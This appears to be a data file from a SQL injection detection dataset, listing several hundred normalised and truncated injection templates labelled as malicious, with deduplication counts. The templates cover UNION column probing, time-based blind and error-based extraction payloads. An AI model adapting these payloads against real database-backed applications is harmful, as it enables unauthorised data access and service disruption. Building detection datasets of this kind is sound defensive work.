template,label,original_count,kept,removed
"N' ) ) as A where N = N union all select null,null,null--",1,1,1,0
"N' ) ) as A where N = N union all select null,null--",1,1,1,0
N' ) ) as A where N = N union all select null--,1,1,1,0
N' ) ) or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) ) or N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
"N' ) ) or N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as sys4,",1,1,1,0
"N' ) ) or N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as t3,A",1,1,1,0
"N' ) ) or N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables as t3",1,1,1,0
"N' ) ) or N = ( select count ( * ) from A.systables as t1,A.systables as t2,A.sy",1,1,1,0
"N' ) ) or N = ( select count ( * ) from all_users t1,all_users t2,all_users t3,a",1,1,1,0
"N' ) ) or N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
"N' ) ) or N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
N' ) ) or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ) ||ch,1,1,1,0
N' ) ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring (,1,1,1,0
N' ) ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring (,1,1,1,0
"N' ) ) or elt ( N = N,sleep ( N ) ) #",1,1,1,0
N' ) ) or sleep ( N ) #,1,1,1,0
N' ) ) order by N#,1,1,1,0
N' ) ) order by N--,1,1,1,0
"N' ) ) procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( N,md5 ( HEX ) ",1,1,1,0
N' ) ) union all select null#,1,1,1,0
"N' ) ) union all select null,null#",1,1,1,0
"N' ) ) union all select null,null,null#",1,1,1,0
"N' ) ) union all select null,null,null,null,null,null,null,null,null--",1,1,1,0
"N' ) ) union all select null,null,null--",1,1,1,0
"N' ) ) union all select null,null--",1,1,1,0
N' ) ) union all select null--,1,1,1,0
N' ) A ( select * from ( select ( sleep ( N ) ) ) A ),1,1,1,0
N' ) A ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) A sleep ( N ),1,1,1,0
N' ) A sleep ( N ) #,1,1,1,0
N' ) and ( select * from ( select ( sleep ( N ) ) ) A ),1,1,1,0
N' ) and ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
"N' ) and ( select N from ( select count ( * ) ,concat ( HEX, ( select ( elt ( N ",1,1,1,0
"N' ) and ( select N* ( if ( ( select * from ( select concat ( HEX, ( select ( el",1,1,1,0
"N' ) and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt ( N = N,",1,1,1,0
N' ) and N = ( select N from pg_sleep ( N ) ),1,1,1,0
N' ) and N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
"N' ) and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as sys4,A",1,1,1,0
"N' ) and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as t3,A$",1,1,1,0
"N' ) and N = ( select count ( * ) from A.systables as t1,A.systables as t2,A.sys",1,1,1,0
"N' ) and N = ( select count ( * ) from all_users t1,all_users t2,all_users t3,al",1,1,1,0
"N' ) and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
"N' ) and N = benchmark ( N,md5 ( HEX ) )",1,1,1,0
"N' ) and N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N' ) and N = convert ( A, ( select char ( N ) +char ( N ) +char ( N ) +char ( N ",1,1,1,0
N' ) and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr,1,1,1,0
N' ) and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N ) +char ( N ) + (,1,1,1,0
N' ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( ,1,1,1,0
N' ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( ,1,1,1,0
N' ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( ,1,1,1,0
"N' ) and elt ( N = N,sleep ( N ) )",1,1,1,0
"N' ) and elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N' ) and exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( N = N,N",1,1,1,0
"N' ) and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX ",1,1,1,0
N' ) and sleep ( N ),1,1,1,0
N' ) and sleep ( N ) #,1,1,1,0
"N' ) and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX ) ,",1,1,1,0
N' ) as A where N = N ( select ( case when ( N = N ) then regexp_substring ( rep,1,1,1,0
N' ) as A where N = N ( select ( case when ( N = N ) then regexp_substring ( rep,1,1,1,0
N' ) as A where N = N A ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) as A where N = N A ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
N' ) as A where N = N A sleep ( N ) #,1,1,1,0
N' ) as A where N = N A sleep ( N ) --,1,1,1,0
N' ) as A where N = N and ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) as A where N = N and ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
"N' ) as A where N = N and ( select N from ( select count ( * ) ,concat ( HEX, ( ",1,1,1,0
N' ) as A where N = N and ( select N* ( if ( ( select * from ( select concat ( H,1,1,1,0
"N' ) as A where N = N and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( sele",1,1,1,0
"N' ) as A where N = N and N = ( select count ( * ) from A.systables as t1,A.syst",1,1,1,0
N' ) as A where N = N and N = ( select upper ( A ( chr ( N ) ||chr ( N ) ||chr (,1,1,1,0
"N' ) as A where N = N and N = A.A.sn ( N, ( chr ( N ) ||chr ( N ) ||chr ( N ) ||",1,1,1,0
"N' ) as A where N = N and N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N' ) as A where N = N and N = benchmark ( N,md5 ( HEX ) ) --",1,1,1,0
N' ) as A where N = N and N = cast ( ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr (,1,1,1,0
"N' ) as A where N = N and N = convert ( A, ( select char ( N ) +char ( N ) +char",1,1,1,0
N' ) as A where N = N and N = dbms_utility.sqlid_to_sqlhash ( ( chr ( N ) ||chr ,1,1,1,0
N' ) as A where N = N and N = utl_inaddr.get_host_address ( chr ( N ) ||chr ( N ,1,1,1,0
N' ) as A where N = N and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N ,1,1,1,0
"N' ) as A where N = N and elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N' ) as A where N = N and elt ( N = N,sleep ( N ) ) --",1,1,1,0
"N' ) as A where N = N and exp ( ~ ( select * from ( select concat ( HEX, ( selec",1,1,1,0
"N' ) as A where N = N and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N ",1,1,1,0
N' ) as A where N = N and sleep ( N ) #,1,1,1,0
N' ) as A where N = N and sleep ( N ) --,1,1,1,0
"N' ) as A where N = N and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N",1,1,1,0
N' ) as A where N = N or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) as A where N = N or ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
"N' ) as A where N = N or ( select N from ( select count ( * ) ,concat ( HEX, ( s",1,1,1,0
N' ) as A where N = N or ( select N* ( if ( ( select * from ( select concat ( HE,1,1,1,0
"N' ) as A where N = N or A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( selec",1,1,1,0
"N' ) as A where N = N or N = ( select count ( * ) from A.A as t1,A.columns as t2",1,1,1,0
"N' ) as A where N = N or N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N' ) as A where N = N or N = benchmark ( N,md5 ( HEX ) ) --",1,1,1,0
N' ) as A where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = reg,1,1,1,0
"N' ) as A where N = N or elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N' ) as A where N = N or elt ( N = N,sleep ( N ) ) --",1,1,1,0
"N' ) as A where N = N or exp ( ~ ( select * from ( select concat ( HEX, ( select",1,1,1,0
"N' ) as A where N = N or extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N =",1,1,1,0
N' ) as A where N = N or sleep ( N ) #,1,1,1,0
N' ) as A where N = N or sleep ( N ) --,1,1,1,0
"N' ) as A where N = N or updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,",1,1,1,0
N' ) as A where N = N order by N#,1,1,1,0
N' ) as A where N = N order by N--,1,1,1,0
"N' ) as A where N = N procedure A ( extractvalue ( N,concat ( HEX, ( benchmark (",1,1,1,0
"N' ) as A where N = N procedure A ( extractvalue ( N,concat ( HEX, ( benchmark (",1,1,1,0
"N' ) as A where N = N procedure A ( extractvalue ( N,concat ( HEX,HEX, ( select ",1,1,1,0
N' ) as A where N = N union all select null#,1,1,1,0
"N' ) as A where N = N union all select null,null#",1,1,1,0
"N' ) as A where N = N union all select null,null,null#",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null#",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null,null#",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null,null,null#",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null,null,null,null#",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null,null,null,null,null#",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null,null,null,null,null,n",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null,null,null--",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null,null--",1,1,1,0
"N' ) as A where N = N union all select null,null,null,null--",1,1,1,0
"N' ) as A where N = N union all select null,null,null--",1,1,1,0
"N' ) as A where N = N union all select null,null--",1,1,1,0
N' ) as A where N = N union all select null--,1,1,1,0
N' ) or ( select * from ( select ( sleep ( N ) ) ) A ),1,1,1,0
N' ) or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
"N' ) or ( select N from ( select count ( * ) ,concat ( HEX, ( select ( elt ( N =",1,1,1,0
"N' ) or ( select N* ( if ( ( select * from ( select concat ( HEX, ( select ( elt",1,1,1,0
"N' ) or A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt ( N = N,N",1,1,1,0
N' ) or N = ( select N from pg_sleep ( N ) ),1,1,1,0
N' ) or N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
"N' ) or N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as sys4,A ",1,1,1,0
"N' ) or N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as t3,A$f",1,1,1,0
"N' ) or N = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all",1,1,1,0
"N' ) or N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
"N' ) or N = benchmark ( N,md5 ( HEX ) )",1,1,1,0
"N' ) or N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
N' ) or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr ,1,1,1,0
N' ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( r,1,1,1,0
N' ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( r,1,1,1,0
N' ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( r,1,1,1,0
"N' ) or elt ( N = N,sleep ( N ) )",1,1,1,0
"N' ) or elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N' ) or exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( N = N,N ",1,1,1,0
"N' ) or extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX )",1,1,1,0
N' ) or sleep ( N ),1,1,1,0
N' ) or sleep ( N ) #,1,1,1,0
"N' ) or updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX ) ,N",1,1,1,0
N' ) order by N#,1,1,1,0
N' ) order by N--,1,1,1,0
"N' ) procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( N,md5 ( HEX ) ) ",1,1,1,0
"N' ) procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( N,md5 ( HEX ) ) ",1,1,1,0
"N' ) procedure A ( extractvalue ( N,concat ( HEX,HEX, ( select ( case when ( N =",1,1,1,0
N' ) union all select null#,1,1,1,0
"N' ) union all select null,null#",1,1,1,0
"N' ) union all select null,null,null#",1,1,1,0
"N' ) union all select null,null,null--",1,1,1,0
"N' ) union all select null,null--",1,1,1,0
N' ) union all select null--,1,1,1,0
N' ) where N = N ( select ( case when ( N = N ) then regexp_substring ( repeat (,1,1,1,0
N' ) where N = N ( select ( case when ( N = N ) then regexp_substring ( repeat (,1,1,1,0
N' ) where N = N A ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) where N = N A ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
N' ) where N = N A sleep ( N ) #,1,1,1,0
N' ) where N = N A sleep ( N ) --,1,1,1,0
N' ) where N = N and ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) where N = N and ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
"N' ) where N = N and ( select N from ( select count ( * ) ,concat ( HEX, ( selec",1,1,1,0
"N' ) where N = N and ( select N* ( if ( ( select * from ( select concat ( HEX, (",1,1,1,0
"N' ) where N = N and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( ",1,1,1,0
N' ) where N = N and N = ( select upper ( A ( chr ( N ) ||chr ( N ) ||chr ( N ) ,1,1,1,0
"N' ) where N = N and N = A.A.sn ( N, ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr (",1,1,1,0
"N' ) where N = N and N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N' ) where N = N and N = benchmark ( N,md5 ( HEX ) ) --",1,1,1,0
N' ) where N = N and N = cast ( ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr ( N ) ,1,1,1,0
"N' ) where N = N and N = convert ( A, ( select char ( N ) +char ( N ) +char ( N ",1,1,1,0
N' ) where N = N and N = dbms_utility.sqlid_to_sqlhash ( ( chr ( N ) ||chr ( N ),1,1,1,0
N' ) where N = N and N = utl_inaddr.get_host_address ( chr ( N ) ||chr ( N ) ||c,1,1,1,0
N' ) where N = N and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N ) +ch,1,1,1,0
"N' ) where N = N and elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N' ) where N = N and elt ( N = N,sleep ( N ) ) --",1,1,1,0
"N' ) where N = N and exp ( ~ ( select * from ( select concat ( HEX, ( select ( e",1,1,1,0
"N' ) where N = N and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N",1,1,1,0
N' ) where N = N and sleep ( N ) #,1,1,1,0
N' ) where N = N and sleep ( N ) --,1,1,1,0
"N' ) where N = N and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ",1,1,1,0
N' ) where N = N or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' ) where N = N or ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
"N' ) where N = N or ( select N from ( select count ( * ) ,concat ( HEX, ( select",1,1,1,0
"N' ) where N = N or ( select N* ( if ( ( select * from ( select concat ( HEX, ( ",1,1,1,0
"N' ) where N = N or A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( e",1,1,1,0
"N' ) where N = N or N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N' ) where N = N or N = benchmark ( N,md5 ( HEX ) ) --",1,1,1,0
N' ) where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_s,1,1,1,0
"N' ) where N = N or elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N' ) where N = N or elt ( N = N,sleep ( N ) ) --",1,1,1,0
"N' ) where N = N or exp ( ~ ( select * from ( select concat ( HEX, ( select ( el",1,1,1,0
"N' ) where N = N or extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ",1,1,1,0
N' ) where N = N or sleep ( N ) #,1,1,1,0
N' ) where N = N or sleep ( N ) --,1,1,1,0
"N' ) where N = N or updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) )",1,1,1,0
N' ) where N = N order by N#,1,1,1,0
N' ) where N = N order by N--,1,1,1,0
"N' ) where N = N procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( N,md",1,1,1,0
"N' ) where N = N procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( N,md",1,1,1,0
"N' ) where N = N procedure A ( extractvalue ( N,concat ( HEX,HEX, ( select ( cas",1,1,1,0
N' ) where N = N union all select null#,1,1,1,0
"N' ) where N = N union all select null,null#",1,1,1,0
"N' ) where N = N union all select null,null,null#",1,1,1,0
"N' ) where N = N union all select null,null,null,null#",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null#",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null,null#",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null,null,null#",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null,null,null,null#",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null,null,null,null,null,n",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null,null,null,null,null,n",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null,null--",1,1,1,0
"N' ) where N = N union all select null,null,null,null,null--",1,1,1,0
"N' ) where N = N union all select null,null,null,null--",1,1,1,0
"N' ) where N = N union all select null,null,null--",1,1,1,0
"N' ) where N = N union all select null,null--",1,1,1,0
N' ) where N = N union all select null--,1,1,1,0
N' A ( select * from ( select ( sleep ( N ) ) ) A ),1,1,1,0
N' A ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N' A sleep ( N ),1,1,1,0
N' A sleep ( N ) #,1,1,1,0
N' and ( select * from ( select ( sleep ( N ) ) ) A ),1,1,1,0
N' and ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
"N' and ( select N from ( select count ( * ) ,concat ( HEX, ( select ( elt ( N = ",1,1,1,0
"N' and ( select N* ( if ( ( select * from ( select concat ( HEX, ( select ( elt ",1,1,1,0
"N' and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt ( N = N,N ",1,1,1,0
N' and N = ( select N from pg_sleep ( N ) ),1,1,1,0
N' and N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
"N' and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as sys4,A a",1,1,1,0
"N' and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as t3,A$fu",1,1,1,0
"N' and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables as t3 ) ",1,1,1,0
"N' and N = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_",1,1,1,0
"N' and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
N' and N = ( select count ( * ) from tablenames ) ; --,1,1,1,0
"N' and N = benchmark ( N,md5 ( HEX ) )",1,1,1,0
"N' and N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N' and N = convert ( A, ( select char ( N ) +char ( N ) +char ( N ) +char ( N ) ",1,1,1,0
N' and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr (,1,1,1,0
N' and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N ) +char ( N ) + ( s,1,1,1,0
N' and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( re,1,1,1,0
N' and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( re,1,1,1,0
N' and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ( re,1,1,1,0
"N' and elt ( N = N,sleep ( N ) )",1,1,1,0
"N' and elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N' and exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( N = N,N )",1,1,1,0
"N' and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX ) ",1,1,1,0
N' and sleep ( N ),1,1,1,0
N' and sleep ( N ) #,1,1,1,0
"N' and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX ) ,N ",1,1,1,0
N' in A A ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( left,1,1,1,0
N' in A A ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( righ,1,1,1,0
N' in A A ) A sleep ( N ) #,1,1,1,0
"N' in A A ) and ( select N from ( select count ( * ) ,concat ( HEX, ( select ( e",1,1,1,0
"N' in A A ) and ( select N* ( if ( ( select * from ( select concat ( HEX, ( sele",1,1,1,0
"N' in A A ) and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt (",1,1,1,0
N' in A A ) and N = ( select N from pg_sleep ( N ) ) #,1,1,1,0
N' in A A ) and N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations a",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations a",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A.systables as t1,A.systables as t",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from A.systables as t1,A.systables as t",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from all_users t1,all_users t2,all_user",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from all_users t1,all_users t2,all_user",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from generate_series ( N,N ) ) #",1,1,1,0
"N' in A A ) and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
N' in A A ) and N = ( select upper ( A ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr,1,1,1,0
"N' in A A ) and N = A.A.sn ( N, ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr ( N ) ",1,1,1,0
N' in A A ) and N = cast ( ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr ( N ) ||chr,1,1,1,0
"N' in A A ) and N = convert ( A, ( select char ( N ) +char ( N ) +char ( N ) +ch",1,1,1,0
N' in A A ) and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ,1,1,1,0
N' in A A ) and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ,1,1,1,0
N' in A A ) and N = dbms_utility.sqlid_to_sqlhash ( ( chr ( N ) ||chr ( N ) ||ch,1,1,1,0
N' in A A ) and N = utl_inaddr.get_host_address ( chr ( N ) ||chr ( N ) ||chr ( ,1,1,1,0
N' in A A ) and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N ) +char ( ,1,1,1,0
N' in A A ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_subst,1,1,1,0
N' in A A ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_subst,1,1,1,0
N' in A A ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_subst,1,1,1,0
N' in A A ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_subst,1,1,1,0
"N' in A A ) and exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( ",1,1,1,0
"N' in A A ) and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ",1,1,1,0
N' in A A ) and sleep ( N ) #,1,1,1,0
"N' in A A ) and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,",1,1,1,0
"N' in A A ) or ( select N from ( select count ( * ) ,concat ( HEX, ( select ( el",1,1,1,0
"N' in A A ) or ( select N* ( if ( ( select * from ( select concat ( HEX, ( selec",1,1,1,0
"N' in A A ) or A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt ( ",1,1,1,0
N' in A A ) or N = ( select N from pg_sleep ( N ) ) #,1,1,1,0
N' in A A ) or N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
"N' in A A ) or N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as ",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as ",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables ",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables ",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from all_users t1,all_users t2,all_users",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from all_users t1,all_users t2,all_users",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from generate_series ( N,N ) ) #",1,1,1,0
"N' in A A ) or N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
N' in A A ) or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ),1,1,1,0
N' in A A ) or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ),1,1,1,0
N' in A A ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substr,1,1,1,0
N' in A A ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substr,1,1,1,0
N' in A A ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substr,1,1,1,0
N' in A A ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substr,1,1,1,0
"N' in A A ) or exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( N",1,1,1,0
"N' in A A ) or extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) )",1,1,1,0
N' in A A ) or sleep ( N ) #,1,1,1,0
"N' in A A ) or updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,H",1,1,1,0
N' in A A ) order by N#,1,1,1,0
N' in A A ) order by N--,1,1,1,0
"N' in A A ) procedure A ( extractvalue ( N,concat ( HEX,HEX, ( select ( case whe",1,1,1,0
N' in A A ) union all select null#,1,1,1,0
"N' in A A ) union all select null,null#",1,1,1,0
"N' in A A ) union all select null,null,null#",1,1,1,0
"N' in A A ) union all select null,null,null,null#",1,1,1,0
"N' in A A ) union all select null,null,null,null,null#",1,1,1,0
"N' in A A ) union all select null,null,null,null,null,null#",1,1,1,0
"N' in A A ) union all select null,null,null,null,null,null,null#",1,1,1,0
"N' in A A ) union all select null,null,null,null,null,null,null,null#",1,1,1,0
"N' in A A ) union all select null,null,null,null,null,null,null,null,null#",1,1,1,0
"N' in A A ) union all select null,null,null,null,null,null,null--",1,1,1,0
"N' in A A ) union all select null,null,null,null,null,null--",1,1,1,0
"N' in A A ) union all select null,null,null,null,null--",1,1,1,0
"N' in A A ) union all select null,null,null,null--",1,1,1,0
"N' in A A ) union all select null,null,null--",1,1,1,0
"N' in A A ) union all select null,null--",1,1,1,0
N' in A A ) union all select null--,1,1,1,0
